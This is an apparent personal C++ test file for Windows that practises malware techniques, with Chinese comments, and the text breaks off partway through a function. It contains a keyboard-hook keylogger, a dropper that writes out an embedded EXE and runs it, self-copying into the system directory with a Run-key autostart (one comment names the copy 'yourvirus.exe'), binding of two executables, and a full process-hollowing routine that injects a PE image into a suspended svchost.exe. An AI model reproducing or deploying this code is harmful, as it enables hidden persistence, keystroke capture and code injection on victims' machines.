
//#define _AFXDLL

#ifdef _AFXDLL
#include "afx.h"
#include "afxwin.h"
#else
#include<stdio.h>
#include <windows.h>
#include <sys\stat.h>
#include <TlHelp32.h>   
#endif

#include "resource.h"

#include "xTest.h"
#include "x_InterfaceEx.h"

namespace space_test_hook {

	//键盘钩子测试

// 	int s_nDown = 0;
// 	HHOOK s_hHook = NULL;           //定义钩子句柄
// 	HINSTANCE s_hInstance = NULL;     //程序实例
// 
// 	LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
// 	{
// 		printf("\n HookProc");
// 		LRESULT Result = CallNextHookEx(s_hHook, nCode, wParam, lParam);
// 		if(wParam == 'M' && (lParam & 0x40000000))
// 		{
// 			printf("\n M is downed ! %d", s_nDown++);
// 		}
// 		return Result;
// 	}
// 
// 	//加载钩子
// 	BOOL Load()
// 	{
// 		s_hInstance = GetModuleHandle(0);
// 		//s_hHook =  SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)HookProc, s_hInstance, 0);
// 		s_hHook =  SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)HookProc, s_hInstance,  GetCurrentThreadId());
// 		if( !s_hHook )
// 		{
// 			printf("\n set hook fail");
// 			return FALSE;
// 		}
// 		printf("\n set hook suc");
// 		return TRUE;
// 	}
// 
// 	//卸载钩子
// 	BOOL UnLoad()
// 	{
// 		return UnhookWindowsHookEx(s_hHook);
// 	}
// 
// 	void test1()
// 	{
// 		BOOL bRet;
// 		bRet = Load();
// 		//nRet = UnLoad();
// 
// 		MSG msg;  
// 		while(::GetMessage(&msg, NULL, 0, 0) > 0)  
// 		{  
// 			TranslateMessage(&msg);  
// 			DispatchMessage(&msg);  
// 		}  
// 	}


	int KeyboardRecord(long code,long scancode,long flags)
	{
		printf("%c", (char)code);
// 		FILE* fp=NULL;
// 		if((fp=fopen("c:\\1.txt","a"))==NULL)
// 		{
// 			exit(1);
// 		}
// 		static int i = 0;
// 		if(i%2==0)
// 		{
// 			fprintf(fp,"%c",(char)code);
// 		}
// 		i++;
// 		fclose(fp);
		return 0;

	}

	void test2()
	{
		if( FALSE == setKeyBoardHook())
		{
			printf("\n set hook fail");
			return;
		}

		setHookFuncKeyBoard(KeyboardRecord);
		
		printf("\n");
		
		MSG msg;
		while ( GetMessage(&msg, NULL, 0, 0) )
		{
			if ( !TranslateAccelerator(msg.hwnd, NULL, &msg) )
			{
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}
		}
		clearAllHook();
	}

	//进程启动测试

	void test3()
	{
		LPTSTR lpCommandLine="D:\\Downloads\\setup.exe";

		STARTUPINFO si;
		memset(&si,0,sizeof(si));
		si.cb=sizeof(si);
		PROCESS_INFORMATION pi;

		int nRet =CreateProcess(NULL, lpCommandLine,   NULL,   NULL,  FALSE, NORMAL_PRIORITY_CLASS,   NULL,   NULL,   &si,   &pi);

		printf("\n");
	}

#ifdef _AFXDLL

	// 资源中包含exe测试

	class CHandleRes
	{
	public:
		CHandleRes() {}
		~CHandleRes() {}

		DWORD	GetResourceData(HINSTANCE hInstance, PTCHAR pszResID, PTCHAR pszResType, PBYTE& pResData)
		{
			DWORD dwResSize;
			DWORD dwErr = 0;
// 			if(!hInstance)
// 			{
// 				return -1;
// 			}

			HRSRC	hRsrc	= FindResource(hInstance, pszResID, pszResType);
			if(!hRsrc)
			{
				dwErr = GetLastError();
				return -2;
			}

			dwResSize	= SizeofResource(hInstance, hRsrc);
			pResData	= PBYTE(LoadResource(hInstance, hRsrc));
			if(!pResData)
			{
				return -3;
			}

			FreeResource(hRsrc);

			return dwResSize;
		}

		DWORD	GetResourceData(HINSTANCE hInstance, UINT uResID, PTCHAR pszResType, PBYTE& pResData)
		{
			return	GetResourceData(hInstance, MAKEINTRESOURCE(uResID), pszResType, pResData);
		}

		BOOL	ReleaseToFile(HINSTANCE hInstance, PTCHAR pszResID, PTCHAR pszResType, PTCHAR pszFileName)
		{
			PBYTE	pData	= NULL;
			DWORD	dwSize	= GetResourceData(hInstance, pszResID, pszResType, pData);
			if( dwSize < 0 )
				return	FALSE;

			CFile	fileRes;

			if(!fileRes.Open(pszFileName, CFile::modeCreate|CFile::modeWrite))
			{
				return	FALSE;
			}
			fileRes.Write(pData, dwSize);
			fileRes.Close();

			return	TRUE;
		}

		BOOL	ReleaseToFile(HINSTANCE hInstance, UINT uResID, PTCHAR pszResType, PTCHAR pszFileName)
		{
			return	ReleaseToFile(hInstance, MAKEINTRESOURCE(uResID), pszResType, pszFileName);
		}

	};

	void test4()
	{
		
// 		if( !AfxWinInit(::GetModuleHandle(NULL), NULL, ::GetCommandLine(),0) )
// 		{
// 			return ;
// 		}

		CHandleRes*	pResProcesser = new CHandleRes;

		//AFX_MANAGE_STATE(AfxGetStaticModuleState());
		//HINSTANCE hInst = GetModuleHandle(NULL);
		//HINSTANCE hInst = AfxGetResourceHandle();
		pResProcesser->ReleaseToFile(NULL, IDR_TXT1, _T("txt"), _T("test_res.txt"));

		delete pResProcesser;

		printf("");
	}

	void test5()
	{
		CHandleRes*	pResProcesser = new CHandleRes;
		pResProcesser->ReleaseToFile(NULL, IDR_EXE1, _T("exe"), _T("test_res.exe"));
		delete pResProcesser;

		//LPTSTR lpCommandLine="E:\\QC-nd\\svn\\MyLab\\trunk\\MyLab\\pro\\xTest\\test_res.exe";
		LPTSTR lpCommandLine="test_res.exe";

		STARTUPINFO si;
		memset(&si,0,sizeof(si));
		si.cb=sizeof(si);
		PROCESS_INFORMATION pi;

		int nRet =CreateProcess(NULL, lpCommandLine,   NULL,   NULL,  FALSE, NORMAL_PRIORITY_CLASS,   NULL,   NULL,   &si,   &pi);

		printf("");
	}

#endif

	// 注册表测试

	void test6()
	{
		HKEY hKey = NULL;
		DWORD dwType;
		DWORD dwSize;

		LSTATUS lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, ("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"), 0, KEY_READ, &hKey);


		DWORD dwCpuSpeed = 0;
		dwType = REG_DWORD;
		dwSize = sizeof(dwType);
		lRet = RegQueryValueEx(hKey, ("~MHz"), NULL, &dwType, (BYTE*)&dwCpuSpeed, &dwSize);

		BYTE sProcessorName[128];
		dwType = REG_SZ;
		dwSize = sizeof(sProcessorName);
		lRet = RegQueryValueEx(hKey, ("ProcessorNameString"), NULL, &dwType, sProcessorName, &dwSize);

		lRet = RegCloseKey(hKey);

		printf("");
	}

	void test7()
	{
		HKEY hKey = NULL;
		
		LSTATUS lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, ("HARDWARE\\DESCRIPTION\\System\\CentralProcessor"), 0, KEY_READ, &hKey);

		CHAR sKeyName[128];
		DWORD dwNameSize;
		DWORD dwIndex = 0;

		do 
		{
			sKeyName[0] = '\0';
			dwNameSize = 128;
			lRet = RegEnumKeyEx(hKey, dwIndex, sKeyName, &dwNameSize, 0, NULL, NULL, NULL);
			if ( 0 != lRet )
			{
				break;
			}

			printf("\n dwIndex = %d, sKeyName = %s", dwIndex, sKeyName);
			dwIndex++;

		} while (true);

		lRet = RegCloseKey(hKey);

		printf("\n total = %d", dwIndex);
	}

	void test8()
	{
		HKEY hKey = NULL;
		HKEY hSubKey1 = NULL;
		HKEY hSubKey2 = NULL;

		LSTATUS lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, ("HARDWARE"), 0, KEY_READ, &hKey);
		lRet = RegOpenKeyEx(hKey, ("DESCRIPTION\\System\\CentralProcessor"), 0, KEY_WRITE, &hSubKey1);
		lRet = RegOpenKeyEx(hSubKey1, ("0"), 0, KEY_READ, &hSubKey2);

		DWORD dwType;
		DWORD dwSize;

		DWORD dwCpuSpeed = 0;
		dwType = REG_DWORD;
		dwSize = sizeof(dwType);
		lRet = RegQueryValueEx(hSubKey2, ("~MHz"), NULL, &dwType, (BYTE*)&dwCpuSpeed, &dwSize);
		
		BYTE sProcessorName[128];
		dwType = REG_SZ;
		dwSize = sizeof(sProcessorName);
		lRet = RegQueryValueEx(hSubKey2, ("ProcessorNameString"), NULL, &dwType, sProcessorName, &dwSize);

		RegCloseKey(hSubKey2);
		RegCloseKey(hSubKey1);
		RegCloseKey(hKey);

		printf("");
	}

	// exe自复制，自启动测试

	void test9()
	{
		char system[MAX_PATH];
		char pathtofile[MAX_PATH];
		HMODULE GetModH = GetModuleHandle(NULL);
		//得到当前执行文件的全路径
		GetModuleFileName(GetModH, pathtofile, sizeof(pathtofile));
		//得到系统文件所在目录的路径，如c:\windows\system32
		GetSystemDirectory(system, sizeof(system));
		//形成要复制到的全路径，如c:\windows\system32\yourvirus.exe
		strcat(system,"\\AAAAA.exe");


		//自我复制到目标路径
		//LPTSTR lpCommandLine = "C:\\AAAAA.exe";
		LPTSTR lpCommandLine = system;
		BOOL bRet = CopyFile(pathtofile, system, false);

		//QA 复制到系统文件夹找不到对应文件，  但是用代码打开运行 或谷歌浏览器打开上层目录可以找到？ 会被复制到"C:\Windows\SysWOW64"文件夹下

		int nRet;

		if(bRet)
		{
			STARTUPINFO si;
			memset(&si,0,sizeof(si));
			si.cb=sizeof(si);
			PROCESS_INFORMATION pi;

			if(false)
			{
				nRet =CreateProcess(NULL, lpCommandLine,   NULL,   NULL,  FALSE, NORMAL_PRIORITY_CLASS|CREATE_NEW_CONSOLE,   NULL,   NULL,   &si,   &pi);
			}
			else
			{
				//写入注册表，以便开机自动运行
				HKEY hKey;
				LSTATUS lSta;

// 				lSta = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey );
// 				lSta = RegSetValueEx(hKey, "Writing to the Registry Example", 0, REG_SZ, (const unsigned char*)system, sizeof(system));

				BYTE sProcessorName[MAX_PATH];
				DWORD dwType = REG_SZ;
				DWORD dwSize = sizeof(sProcessorName);
				lSta = RegOpenKeyEx(HKEY_LOCAL_MACHINE, ("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_READ, &hKey);
				lSta = RegQueryValueEx(hKey, ("Writing to the Registry Example"), NULL, &dwType, sProcessorName, &dwSize);

				lSta = RegCloseKey(hKey);
				printf("");

				//QA: 写入注册表成功， 也能开机启动，但是注册表上找不到对应值 ? 6位系统路径变为 "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
			}

			
			printf("");
		}

		



		printf("");
	}

	// 文件捆绑测试
	int BindFile(const char* s1,  const char* s2, const char* s3)
	{
		FILE* f1 = NULL;
		FILE* f2 = NULL;
		FILE* f3 = NULL;

		f1 = fopen(s1, "rb");
		f2 = fopen(s2, "rb");
		f3 = fopen(s3, "wb");

		if( !f1 || !f2 || !f3 )
		{
			return -1;
		}

		struct _stat st1;
		struct _stat st2;
		_stat(s1, &st1);
		_stat(s2, &st2);

		if ( 0 == st1.st_size || 0 == st2.st_size )
		{
			return -2;
		}

		int nBuffLen = st1.st_size + st2.st_size;
		char* pBuff = new char[nBuffLen+100];

		if( NULL == pBuff )
		{
			return -3;
		}

		int nReadLen = fread(pBuff, 1, st1.st_size, f1);
		if ( nReadLen <= 0 )
		{
			return -4;
		}

		nReadLen = fread(pBuff+nReadLen, 1, st2.st_size, f2);
		if ( nReadLen <= 0 )
		{
			return -5;
		}

		int nWriteLen = fwrite(pBuff, 1, nBuffLen, f3);

		fclose(f1);
		fclose(f2);
		fclose(f3);
		delete[] pBuff;

		return 0;
	}

	void test10()
	{
		int nRet = BindFile(
			"E:\\Downloads\\tmp\\a.exe",
			"E:\\Downloads\\tmp\\b.exe",
			"E:\\Downloads\\tmp\\c.exe");

		printf("");

		//QA: 将B.exe连在A.exe  启动时只会启动A.exe
	}

	// 内存中运行exe
//#pragma pack (push ,1)
	struct PEHeader
	{
		unsigned long signature;
		unsigned short machine;
		unsigned short numSections;
		unsigned long timeDateStamp;
		unsigned long pointerToSymbolTable;
		unsigned long numOfSymbols;
		unsigned short sizeOfOptionHeader;
		unsigned short characteristics;
	};
	typedef struct PEHeader PE_Header;

	struct PEExtHeader
	{
		unsigned short magic;
		unsigned char majorLinkerVersion;
		unsigned char minorLinkerVersion;
		unsigned long sizeOfCode;
		unsigned long sizeOfInitializedData;
		unsigned long sizeOfUninitializedData;
		unsigned long addressOfEntryPoint;
		unsigned long baseOfCode;
		unsigned long baseOfData;
		unsigned long imageBase;
		unsigned long sectionAlignment;
		unsigned long fileAlignment;
		unsigned short majorOSVersion;
		unsigned short minorOSVersion;
		unsigned short majorImageVersion;
		unsigned short minorImageVersion;
		unsigned short majorSubsystemVersion;
		unsigned short minorSubsystemVersion;
		unsigned long reserved1;
		unsigned long sizeOfImage;
		unsigned long sizeOfHeaders;
		unsigned long checksum;
		unsigned short subsystem;
		unsigned short DLLCharacteristics;
		unsigned long sizeOfStackReserve;
		unsigned long sizeOfStackCommit;
		unsigned long sizeOfHeapReserve;
		unsigned long sizeOfHeapCommit;
		unsigned long loaderFlags;
		unsigned long numberOfRVAAndSizes;
		unsigned long exportTableAddress;
		unsigned long exportTableSize;
		unsigned long importTableAddress;
		unsigned long importTableSize;
		unsigned long resourceTableAddress;
		unsigned long resourceTableSize;
		unsigned long exceptionTableAddress;
		unsigned long exceptionTableSize;
		unsigned long certFilePointer;
		unsigned long certTableSize;
		unsigned long relocationTableAddress;
		unsigned long relocationTableSize;
		unsigned long debugDataAddress;
		unsigned long debugDataSize;
		unsigned long archDataAddress;
		unsigned long archDataSize;
		unsigned long globalPtrAddress;
		unsigned long globalPtrSize;
		unsigned long TLSTableAddress;
		unsigned long TLSTableSize;
		unsigned long loadConfigTableAddress;
		unsigned long loadConfigTableSize;
		unsigned long boundImportTableAddress;
		unsigned long boundImportTableSize;
		unsigned long importAddressTableAddress;
		unsigned long importAddressTableSize;
		unsigned long delayImportDescAddress;
		unsigned long delayImportDescSize;
		unsigned long COMHeaderAddress;
		unsigned long COMHeaderSize;
		unsigned long reserved2;
		unsigned long reserved3;
	};
	typedef struct PEExtHeader PE_ExtHeader;

	struct Section_Header
	{
		unsigned char sectionName[8];
		unsigned long virtualSize;
		unsigned long virtualAddress;
		unsigned long sizeOfRawData;
		unsigned long pointerToRawData;
		unsigned long pointerToRelocations;
		unsigned long pointerToLineNumbers;
		unsigned short numberOfRelocations;
		unsigned short numberOfLineNumbers;
		unsigned long characteristics;
	};
	typedef struct Section_Header SectionHeader;

	struct MZ_Header
	{
		unsigned short signature;
		unsigned short partPag;
		unsigned short pageCnt;
		unsigned short reloCnt;
		unsigned short hdrSize;
		unsigned short minMem;
		unsigned short maxMem;
		unsigned short reloSS;
		unsigned short exeSP;
		unsigned short chksum;
		unsigned short exeIP;
		unsigned short reloCS;
		unsigned short tablOff;
		unsigned short overlay;
		unsigned char reserved[32];
		unsigned long offsetToPE;
	};
	typedef struct MZ_Header MZHeader;

	struct Import_DirEntry
	{
		DWORD importLookupTable;
		DWORD timeDateStamp;
		DWORD fowarderChain;
		DWORD nameRVA;
		DWORD importAddressTable;
	};
	typedef struct Import_DirEntry ImportDirEntry;

	struct Fixup_Block
	{
		unsigned long pageRVA;
		unsigned long blockSize;
	};
	typedef struct Fixup_Block FixupBlock;

	#define TARGETPROC "svchost.exe"

	typedef struct _PROCINFO
	{
		DWORD baseAddr;
		DWORD imageSize;
	} PROCINFO;
//#pragma pack (pop , 1) 
	BOOL EXPD = FALSE;
	CHAR* PID;

	//**********************************************************************************************************
	//
	// This function reads the MZ, PE, PE extended and Section Headers from an EXE file.
	//
	//**********************************************************************************************************
	//
	// 解析PE文件，得到 PE 结构
	//
	BOOL readPEInfo(FILE *fp, MZHeader *outMZ,PE_Header *outPE,PE_ExtHeader *outpeXH,SectionHeader **outSecHdr)
	{
		MZHeader mzH;
		long fileSize;
		PE_Header peH;
		PE_ExtHeader peXH;
		SectionHeader *secHdr;
   
		fseek(fp, 0, SEEK_END);
		fileSize = ftell(fp);
		fseek(fp, 0, SEEK_SET);

		if(fileSize < sizeof(MZHeader))
		{
			printf("File size too small\n");      
			return FALSE;
		}

		// read MZ Header
		fread(&mzH, sizeof(MZHeader), 1, fp);

		if(mzH.signature != 0x5a4d)      // MZ
		{
			printf("File does not have MZ header\n");
			return FALSE;
		}

		printf("Offset to PE Header = %X\n", mzH.offsetToPE);

		if((unsigned long)fileSize < mzH.offsetToPE + sizeof(PE_Header))
		{
			printf("File size too small\n");      
			return FALSE;
		}

		// read PE Header
		fseek(fp, mzH.offsetToPE, SEEK_SET);
		fread(&peH, sizeof(PE_Header), 1, fp);

		printf("Size of option header = %d\n", peH.sizeOfOptionHeader);
		printf("Number of sections = %d\n", peH.numSections);

		if(peH.sizeOfOptionHeader != sizeof(PE_ExtHeader))
		{
			printf("Unexpected option header size.\n");
      
			return FALSE;
		}

		// read PE Ext Header
		fread(&peXH, sizeof(PE_ExtHeader), 1, fp);

		printf("Import table address = %X\n", peXH.importTableAddress);
		printf("Import table size = %X\n", peXH.importTableSize);
		printf("Import address table address = %X\n", peXH.importAddressTableAddress);
		printf("Import address table size = %X\n", peXH.importAddressTableSize);


		// read the sections
		secHdr = (SectionHeader*)malloc( sizeof(SectionHeader)* (peH.numSections) );

		fread(secHdr, sizeof(SectionHeader) * peH.numSections, 1, fp);

		*outMZ = mzH;
		*outPE = peH;
		*outpeXH = peXH;
		*outSecHdr = secHdr;

		return TRUE;
	}


	//**********************************************************************************************************
	//
	// This function calculates the size required to load an EXE into memory with proper alignment.
	//
	//**********************************************************************************************************
	//
	// 返回文件所占用的内存空间
	//
	int calcTotalImageSize(MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,SectionHeader *inSecHdr)
	{
		int result = 0;
		int val, i;
		int alignment = inpeXH->sectionAlignment;

		if(inpeXH->sizeOfHeaders % alignment == 0)   // PE头对齐
			result += inpeXH->sizeOfHeaders;
		else
		{
			val = inpeXH->sizeOfHeaders / alignment;
			val++;
			result += (val * alignment);
		}


		for(i = 0; i < inPE->numSections; i++) // 节对齐
		{
			if(inSecHdr[i].virtualSize)
			{
				if(inSecHdr[i].virtualSize % alignment == 0)
					result += inSecHdr[i].virtualSize;
				else
				{
					int val = inSecHdr[i].virtualSize / alignment;
					val++;
					result += (val * alignment);
				}
			}
		}

		return result; 
	}


	//**********************************************************************************************************
	//
	// This function calculates the aligned size of a section
	//
	//**********************************************************************************************************
	//
	// 返回真实在内存中占用的大小
	//
	unsigned long getAlignedSize(unsigned long curSize, unsigned long alignment)
	{   
	   if(curSize % alignment == 0)
		  return curSize;
	   else
	   {
		  int val = curSize / alignment;
		  val++;
		  return (val * alignment);
	   }
	}


	//**********************************************************************************************************
	//
	// This function loads a PE file into memory with proper alignment.
	// Enough memory must be allocated at ptrLoc.
	//
	//**********************************************************************************************************
	//
	// 加载PE文件到内存中
	//
	BOOL loadPE(FILE *fp, MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,SectionHeader *inSecHdr, LPVOID ptrLoc)
	{
		unsigned long headerSize, readSize;
		int i;
		char *outPtr = (char *)ptrLoc;

		fseek(fp, 0, SEEK_SET);
		headerSize = inpeXH->sizeOfHeaders;

		// certain PE files have sectionHeaderSize value > size of PE file itself. 
		// this loop handles this situation by find the section that is nearest to the
		// PE header.
	//
	// 如果文件太小，以至与PE头中还包括了节的内容，这样就先不拷贝节的内容
	// 当然这种情况很少见
	//
		for(i = 0; i < inPE->numSections; i++)
		{
			if(inSecHdr[i].pointerToRawData < headerSize)
				headerSize = inSecHdr[i].pointerToRawData;
		}

	   // read the PE header
		readSize = fread(outPtr, 1, headerSize, fp);
		printf("HeaderSize = %d\n", headerSize);
		if(readSize != headerSize)
		{
			printf("Error reading headers (%d %d)\n", readSize, headerSize);
			return FALSE;      
		}

	   //
	   // getAlignedSize 返回真实占用的内存的大小
	   //
	   outPtr += getAlignedSize(inpeXH->sizeOfHeaders, inpeXH->sectionAlignment);

	   // read the sections
	   for(i = 0; i < inPE->numSections; i++)
	   {
			if(inSecHdr[i].sizeOfRawData > 0)
			{
				unsigned long toRead = inSecHdr[i].sizeOfRawData;
				if(toRead > inSecHdr[i].virtualSize)
					toRead = inSecHdr[i].virtualSize;

				fseek(fp, inSecHdr[i].pointerToRawData, SEEK_SET);
				readSize = fread(outPtr, 1, toRead, fp);

				if(readSize != toRead)
				{
					printf("Error reading section %d\n", i);
					return FALSE;
				}
				outPtr += getAlignedSize(inSecHdr[i].virtualSize, inpeXH->sectionAlignment);
				}
				else
				{
				// this handles the case where the PE file has an empty section. E.g. UPX0 section
				// in UPXed files.

				if(inSecHdr[i].virtualSize)
					outPtr += getAlignedSize(inSecHdr[i].virtualSize, inpeXH->sectionAlignment);
			}
		}

		return TRUE;
	}





	//**********************************************************************************************************
	//
	// This function loads a PE file into memory with proper alignment.
	// Enough memory must be allocated at ptrLoc.
	//
	//**********************************************************************************************************

	void doRelocation(MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,
				SectionHeader *inSecHdr, LPVOID ptrLoc, DWORD newBase)
	{
		long delta;
		int numEntries,i, relocType;
		unsigned short *offsetPtr;
		DWORD *codeLoc;
		FixupBlock *fixBlk;

		if(inpeXH->relocationTableAddress && inpeXH->relocationTableSize)
		{
			fixBlk = (FixupBlock *)((char *)ptrLoc + inpeXH->relocationTableAddress);
			delta = newBase - inpeXH->imageBase;

			while(fixBlk->blockSize)
			{
				printf("Addr = %X\n", fixBlk->pageRVA);
				printf("Size = %X\n", fixBlk->blockSize);

				numEntries = (fixBlk->blockSize - sizeof(FixupBlock)) >> 1;
				printf("Num Entries = %d\n", numEntries);

				offsetPtr = (unsigned short *)(fixBlk + 1);

				for(i = 0; i < numEntries; i++)
				{
					codeLoc = (DWORD *)((char *)ptrLoc + fixBlk->pageRVA + (*offsetPtr & 0x0FFF));

					relocType = (*offsetPtr & 0xF000) >> 12;

					printf("Val = %X\n", *offsetPtr);
					printf("Type = %X\n", relocType);

					if(relocType == 3)
						*codeLoc = ((DWORD)*codeLoc) + delta;
					else
					{
						printf("Unknown relocation type = %d\n", relocType);
					}
					offsetPtr++;
				}

				fixBlk = (FixupBlock *)offsetPtr;
			}
		}   
	}


	//**********************************************************************************************************
	//
	// Creates the original EXE in suspended mode and returns its info in the PROCINFO structure.
	//
	//**********************************************************************************************************


      
      
	BOOL createChild(PPROCESS_INFORMATION pi,        // OUT
					PCONTEXT ctx,                    // OUT
					PROCINFO *outChildProcInfo        // OUT
	)
	{
		PROCINFO *outChildProcInfo2 = NULL;
		STARTUPINFO si = {0};
		DWORD read;
		DWORD *pebInfo;
		DWORD curAddr;
		MEMORY_BASIC_INFORMATION memInfo, memInfo2;
		DEBUG_EVENT DBEvent;
		DWORD read2, curAddr2;
		DWORD *pebInfo2;

		BOOL bRet;
		if(!EXPD)
		{
			if(CreateProcess(NULL, 
				TARGETPROC,
				  NULL, 
				NULL, 
				0, 
				CREATE_SUSPENDED, 
				NULL, 
				NULL, 
				&si, 
				pi))      
			{
				ctx->ContextFlags=CONTEXT_FULL;
				bRet = GetThreadContext(pi->hThread, ctx);

		// // 获取外壳进程运行状态，[ctx.Ebx+8]内存处存的是外壳进程的加载基址，ctx.Eax存放有外壳进程的入口地址
				pebInfo = (DWORD *)ctx->Ebx;
				bRet = ReadProcessMemory(pi->hProcess, &pebInfo[2], (LPVOID)&(outChildProcInfo->baseAddr), sizeof(DWORD), &read);
   
				curAddr = outChildProcInfo->baseAddr;

			//在 SVCHOST.EXE中寻找 MEM_FREE 的内存地址
				while(VirtualQueryEx(pi->hProcess, (LPVOID)curAddr, &memInfo, sizeof(memInfo)))
				{
					if(memInfo.State == MEM_FREE)
						break;
					curAddr += memInfo.RegionSize;
				}
				outChildProcInfo->imageSize = (DWORD)curAddr - (DWORD)outChildProcInfo->baseAddr;

				return TRUE;
		   }
		} 
	   else{
		if(DebugActiveProcess((DWORD)*PID))
		{
		   WaitForDebugEvent(&DBEvent,INFINITE);
		   pi->hThread=DBEvent.u.CreateProcessInfo.hThread;
		   pi->hProcess=DBEvent.u.CreateProcessInfo.hProcess;
			 ctx->ContextFlags=CONTEXT_FULL;
		  GetThreadContext(pi->hThread, ctx);
		  pebInfo2 = (DWORD *)ctx->Ebp;
		  *pebInfo2+=0x30;
		  ReadProcessMemory(pi->hProcess, &pebInfo2[2], (LPVOID)&(outChildProcInfo2->baseAddr), sizeof(DWORD), &read2);
   
		  curAddr2 = outChildProcInfo2->baseAddr;
		  while(VirtualQueryEx(pi->hProcess, (LPVOID)curAddr2, &memInfo2, sizeof(memInfo2)))
		  {
			if(memInfo2.State == MEM_FREE)
			   break;
			curAddr2+= memInfo2.RegionSize;
		  }
		  outChildProcInfo2->imageSize = (DWORD)curAddr2 - (DWORD)outChildProcInfo2->baseAddr;

		  return TRUE;
		  }
	   }
   
	   return FALSE;
	}


	//**********************************************************************************************************
	//
	// Returns TRUE if the PE file has a relocation table
	//
	//**********************************************************************************************************

	BOOL hasRelocationTable(PE_ExtHeader *inpeXH)
	{
	   if(inpeXH->relocationTableAddress && inpeXH->relocationTableSize)
	   {
		  return TRUE;
	   }
	   return FALSE;
	}


	typedef DWORD (WINAPI *PTRZwUnmapViewOfSection)(IN HANDLE ProcessHandle, IN PVOID BaseAddress);


	//**********************************************************************************************************
	//
	// To replace the original EXE with another one we do the following.
	// 1) Create the original EXE process in suspended mode.
	// 2) Unmap the image of the original EXE.
	// 3) Allocate memory at the baseaddress of the new EXE.
	// 4) Load the new EXE image into the allocated memory. 
	// 5) Windows will do the necessary imports and load the required DLLs for us when we resume the suspended
	//   thread.
	//
	// When the original EXE process is created in suspend mode, GetThreadContext returns these useful
	// register values.
	// EAX - process entry point
	// EBX - points to PEB
	//
	// So before resuming the suspended thread, we need to set EAX of the context to the entry point of the
	// new EXE.
	//
	//**********************************************************************************************************

	void doFork(MZHeader *inMZ, 
				PE_Header *inPE, 
				PE_ExtHeader *inpeXH,
				SectionHeader *inSecHdr, LPVOID ptrLoc,DWORD imageSize)
	{
	   STARTUPINFO si = {0};
	   PROCESS_INFORMATION pi;
	   CONTEXT ctx;
	   PROCINFO childInfo;
	   LPVOID v;
	   DWORD oldProtect;
	   DWORD *pebInfo;
	   DWORD wrote; 
	   PE_ExtHeader *peXH;
   
	   if(createChild(&pi, &ctx, &childInfo))
	   {      
		   pebInfo = (DWORD *)ctx.Ebx;
		  printf("Original EXE loaded (PID = %d).\n", pi.dwProcessId);
		  printf("Original Base Addr = %X, Size = %X\n", childInfo.baseAddr, childInfo.imageSize);
      
		  v = (LPVOID)NULL;
      
		  if(inpeXH->imageBase == childInfo.baseAddr && imageSize <= childInfo.imageSize)
		  {
			// if new EXE has same baseaddr and is its size is <= to the original EXE, just
			// overwrite it in memory
			v = (LPVOID)childInfo.baseAddr;
			VirtualProtectEx(pi.hProcess, (LPVOID)childInfo.baseAddr, childInfo.imageSize, PAGE_EXECUTE_READWRITE, &oldProtect);        
        
			printf("Using Existing Mem for New EXE at %X\n", (unsigned long)v);
		  }
		  else
		  {
			// get address of ZwUnmapViewOfSection
			PTRZwUnmapViewOfSection pZwUnmapViewOfSection = (PTRZwUnmapViewOfSection)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwUnmapViewOfSection");

			// try to unmap the original EXE image
			if(pZwUnmapViewOfSection(pi.hProcess, (LPVOID)childInfo.baseAddr) == 0)
			{
			   // allocate memory for the new EXE image at the prefered imagebase.
			   v = VirtualAllocEx(pi.hProcess, (LPVOID)inpeXH->imageBase, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			   if(v)
				  printf("Unmapped and Allocated Mem for New EXE at %X\n", (unsigned long)v);
			}
		  }

		  if(!v && hasRelocationTable(inpeXH))
		  {
			// if unmap failed but EXE is relocatable, then we try to load the EXE at another
			// location
			v = VirtualAllocEx(pi.hProcess, (void *)NULL, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if(v)
			{
			   printf("Allocated Mem for New EXE at %X. EXE will be relocated.\n", (unsigned long)v);

			   // we&#39;ve got to do the relocation ourself if we load the image at another
			   // memory location           
			   doRelocation(inMZ, inPE, inpeXH, inSecHdr, ptrLoc, (DWORD)v);
			}
		  }

		  printf("EIP = %X\n", ctx.Eip);
		  printf("EAX = %X\n", ctx.Eax);
		  printf("EBX = %X\n", ctx.Ebx);      // EBX points to PEB
		  printf("ECX = %X\n", ctx.Ecx);
		  printf("EDX = %X\n", ctx.Edx);
      
		  if(v)
		  {        
			printf("New EXE Image Size = %X\n", imageSize);
        
			// patch the EXE base addr in PEB (PEB + 8 holds process base addr)
            
			WriteProcessMemory(pi.hProcess, &pebInfo[2], &v, sizeof(DWORD), &wrote);

			// patch the base addr in the PE header of the EXE that we load ourselves
			peXH = (PE_ExtHeader *)((DWORD)inMZ->offsetToPE + sizeof(PE_Header) + (DWORD)ptrLoc);
			peXH->imageBase = (DWORD)v;
        
			if(WriteProcessMemory(pi.hProcess, v, ptrLoc, imageSize, NULL))
			{   
			   printf("New EXE image injected into process.\n");

			   ctx.ContextFlags=CONTEXT_FULL;           
			   //ctx.Eip = (DWORD)v + ((DWORD)dllLoaderWritePtr - (DWORD)ptrLoc);
           
			   if((DWORD)v == childInfo.baseAddr)
			   {
				  ctx.Eax = (DWORD)inpeXH->imageBase + inpeXH->addressOfEntryPoint;      // eax holds new entry point
			   }
			   else
			   {
				  // in this case, the DLL was not loaded at the baseaddr, i.e. manual relocation was
				  // performed.
				  ctx.Eax = (DWORD)v + inpeXH->addressOfEntryPoint;      // eax holds new entry point
			   }

			   printf("********> EIP = %X\n", ctx.Eip);
			   printf("********> EAX = %X\n", ctx.Eax);

			   SetThreadContext(pi.hThread,&ctx);

